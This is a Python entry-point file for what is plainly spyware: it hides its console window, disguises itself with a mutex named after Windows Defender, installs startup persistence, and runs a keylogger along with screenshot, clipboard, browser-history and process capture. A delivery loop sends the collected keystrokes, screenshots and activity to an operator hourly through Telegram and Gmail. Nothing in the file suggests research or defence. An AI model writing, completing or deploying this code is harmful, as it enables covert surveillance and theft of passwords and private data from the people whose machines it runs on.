# main.py — agent entry point
# Runs silently on boot, collects activity, stores encrypted in vault
# Sends hourly reports via Gmail and Telegram

import ctypes, sys, time, traceback, os
from pathlib import Path

# ── CRASH LOGGER — writes any error to Desktop\pw_error.log ──────────────────
LOG_PATH = Path(os.path.expanduser("~")) / "Desktop" / "pw_error.log"

def _log(msg: str):
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            from datetime import datetime
            f.write(f"[{datetime.now()}] {msg}\n")
    except Exception:
        pass

sys.excepthook = lambda t, v, tb: _log("CRASH:\n" + "".join(traceback.format_exception(t, v, tb)))

_log("Agent started")

# ── HIDE CONSOLE WINDOW IMMEDIATELY ──────────────────────────────────────────
def _hide():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception as e:
        _log(f"hide error: {e}")

_hide()

# ── IMPORTS ───────────────────────────────────────────────────────────────────
try:
    _log("importing config")
    import config
    _log(f"vault dir: {config.VAULT_DIR}")

    from vault.vault_manager import (
        init_vault, vault_write, vault_write_screenshot,
        vault_read_all, vault_read_screenshot
    )
    from modules import keylogger, screenshot, browser_history, process_tracker, clipboard
    from modules.delivery import email_delivery, telegram_delivery
    from persistence.startup import install
    _log("imports OK")
except Exception as e:
    _log(f"IMPORT ERROR: {e}\n{traceback.format_exc()}")
    sys.exit(1)

# ── SINGLE INSTANCE CHECK ─────────────────────────────────────────────────────
try:
    import win32event, win32api, winerror
    MUTEX_NAME = "Global\\WindowsDefenderCacheMutex"
    mutex = win32event.CreateMutex(None, False, MUTEX_NAME)
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        _log("already running — exit")
        sys.exit(0)
except Exception as e:
    _log(f"MUTEX ERROR: {e}")

# ── VAULT INIT ────────────────────────────────────────────────────────────────
try:
    vault_dir = config.VAULT_DIR
    _log(f"init vault at {vault_dir}")
    key = init_vault(vault_dir, config.VAULT_PASSWORD)
    _log("vault OK")
except Exception as e:
    _log(f"VAULT ERROR: {e}\n{traceback.format_exc()}")
    sys.exit(1)

# ── PERSISTENCE ───────────────────────────────────────────────────────────────
try:
    install()
    _log("persistence OK")
except Exception as e:
    _log(f"PERSISTENCE ERROR: {e}")

# ── SCREENSHOT BUFFER (last N kept for delivery) ─────────────────────────────
_recent_screenshots = []   # list of (filename, png_bytes)
_sent_screenshots   = set() # filenames already sent — avoid resending
_MAX_SS_MEMORY = 20

# ── CALLBACKS ─────────────────────────────────────────────────────────────────

def on_keylog(text: str):
    vault_write(vault_dir, key, "keylog", text)

def on_screenshot(png_bytes: bytes):
    from datetime import datetime
    fname = datetime.utcnow().strftime("%Y%m%d_%H%M%S") + ".png"
    vault_write_screenshot(vault_dir, key, png_bytes)
    _recent_screenshots.append((fname, png_bytes))
    if len(_recent_screenshots) > _MAX_SS_MEMORY:
        _recent_screenshots.pop(0)
    _log(f"screenshot captured: {fname}")

def on_browser(text: str):
    vault_write(vault_dir, key, "browser", text)

def on_process(text: str):
    vault_write(vault_dir, key, "process", text)

def on_clipboard(text: str):
    vault_write(vault_dir, key, "clipboard", text)

# ── START COLLECTION MODULES ──────────────────────────────────────────────────

try:
    if config.ENABLE_KEYLOGGER:
        keylogger.start(on_keylog, flush_interval=config.LOG_FLUSH_INTERVAL_SECONDS)
        _log("keylogger started")

    if config.ENABLE_SCREENSHOTS:
        screenshot.start(on_screenshot, interval=config.SCREENSHOT_INTERVAL_SECONDS)
        _log("screenshot started")

    if config.ENABLE_BROWSER_HISTORY:
        browser_history.start(on_browser, interval=config.BROWSER_CHECK_INTERVAL_SECONDS)
        _log("browser history started")

    if config.ENABLE_PROCESS_TRACKER:
        process_tracker.start(on_process, interval=10)
        _log("process tracker started")

    if config.ENABLE_CLIPBOARD:
        clipboard.start(on_clipboard, interval=3)
        _log("clipboard started")

    _log("all modules running")
except Exception as e:
    _log(f"MODULE START ERROR: {e}\n{traceback.format_exc()}")

# ── DELIVERY LOOP ─────────────────────────────────────────────────────────────

import threading
from datetime import datetime, timedelta

def delivery_loop():
    """Every DELIVERY_INTERVAL_SECONDS, send report via all enabled channels."""
    # First delivery after 2 minutes so modules have time to collect something
    time.sleep(120)
    while True:
        try:
            _log("delivery triggered")

            # All vault entries from last interval
            since   = datetime.utcnow() - timedelta(seconds=config.DELIVERY_INTERVAL_SECONDS + 120)
            entries = vault_read_all(vault_dir, key)
            recent  = [e for e in entries
                       if datetime.fromisoformat(e["ts"]) >= since]
            _log(f"entries to send: {len(recent)}")

            # Only send screenshots not yet sent
            unsent = [(f, b) for f, b in _recent_screenshots
                      if f not in _sent_screenshots]
            to_send = unsent[-5:]  # max 5 per report
            for fname, _ in to_send:
                _sent_screenshots.add(fname)
            _log(f"screenshots to send: {len(to_send)}")

            # Telegram
            if config.ENABLE_TELEGRAM:
                telegram_delivery.send_report(
                    token       = config.TELEGRAM_BOT_TOKEN,
                    chat_id     = config.TELEGRAM_CHAT_ID,
                    entries     = recent,
                    screenshots = to_send if to_send else None
                )
                _log("telegram sent")

            # Gmail
            if config.ENABLE_EMAIL:
                body = email_delivery.build_report_text(recent)
                email_delivery.send_report(
                    email_from     = config.EMAIL_FROM,
                    email_password = config.EMAIL_PASSWORD,
                    email_to       = config.EMAIL_TO,
                    subject_prefix = config.EMAIL_SUBJECT_PREFIX,
                    text_body      = body,
                    screenshots    = to_send[-3:] if to_send else None
                )

        except Exception as e:
            _log(f"DELIVERY ERROR: {e}\n{traceback.format_exc()}")

        time.sleep(config.DELIVERY_INTERVAL_SECONDS)

t_delivery = threading.Thread(target=delivery_loop, daemon=True)
t_delivery.start()

# ── KEEP ALIVE ────────────────────────────────────────────────────────────────
while True:
    time.sleep(60)
